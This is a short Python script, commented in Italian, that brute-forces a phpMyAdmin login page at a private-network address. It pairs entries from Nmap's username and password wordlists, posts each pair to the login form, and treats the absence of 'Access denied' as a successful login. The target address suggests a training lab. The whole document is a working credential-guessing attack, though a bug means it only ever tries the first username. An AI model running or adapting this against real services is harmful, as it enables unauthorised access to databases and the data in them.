import requests

# Percorso del file contenente gli usernames
username_file_path = "/usr/share/nmap/nselib/data/usernames.lst"
# Percorso del file contenente le passwords
password_file_path = "/usr/share/nmap/nselib/data/passwords.lst"

# Apre i file in modalità lettura
with open(username_file_path, "r") as usernames, open(
    password_file_path, "r"
) as passwords:
    # Ciclo per ogni username nel file
    for username in usernames:
        # Rimuove spazi vuoti e caratteri di nuova linea dall'username
        username = username.rstrip()

        # Ciclo per ogni password nel file
        for password in passwords:
            # Rimuove spazi vuoti e caratteri di nuova linea dalla password
            password = password.rstrip()

            # URL del sito a cui inviare la richiesta POST
            url = "http://192.168.32.101/phpMyAdmin/"

            # Payload dei dati da inviare nella richiesta POST
            payload = {
                "pma_username": username,
                "pma_password": password,
                "input_go": "Go",
            }

            try:
                # Invia la richiesta POST con i dati del payload
                response = requests.post(url, data=payload)

                # Stampa username e password attualmente testati
                print(f"Username: {username}, Password: {password}", end=" ")

                # Verifica la risposta HTTP
                if response.status_code == 200:
                    # Se la stringa "Access denied" è presente nella risposta, la login non è riuscita
                    if "Access denied" in response.text:
                        print("Login fallita")
                    else:
                        # Se la login ha successo, stampa un messaggio e termina lo script
                        print("Successo!!")
                        exit()
                else:
                    # Se la risposta HTTP non è 200, stampa il codice di stato
                    print("Errore:", response.status_code)
            except requests.exceptions.RequestException as e:
                # Se si verifica un errore durante la richiesta, stampa il messaggio di errore
                print("Errore nella richiesta: ", e)
